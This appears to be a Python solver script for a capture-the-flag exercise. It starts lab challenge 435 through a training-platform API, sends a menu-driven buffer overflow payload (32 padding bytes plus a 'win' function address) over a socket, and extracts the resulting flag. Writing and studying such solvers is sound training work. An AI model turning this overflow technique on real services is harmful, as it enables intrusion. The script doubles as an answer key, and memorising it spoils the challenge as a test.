import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/435/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/435/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x4011a0
payload = b"A" * 32 + struct.pack("<I", WIN)
print("payload:", payload[:48])
s = socket.create_connection((host, port), timeout=20)
s.settimeout(6)
time.sleep(0.4)


def rd(t=1.2):
    s.settimeout(t)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
            if b"choice" in buf:
                break
        except socket.timeout:
            break
    return buf.decode("utf-8", "replace")


print("--- menu ---")
print(rd(1.5)[:300])
s.sendall(b"1\n")
time.sleep(0.3)
print("--- heap ---")
print(rd(1.0)[:400])
s.sendall(b"2\n")
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.4)
rd(0.8)
s.sendall(b"4\n")
time.sleep(0.8)
out = b""
t0 = time.time()
while time.time() - t0 < 5:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("utf-8", "replace")
print("--- reponse 4 ---")
print(txt[:500])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
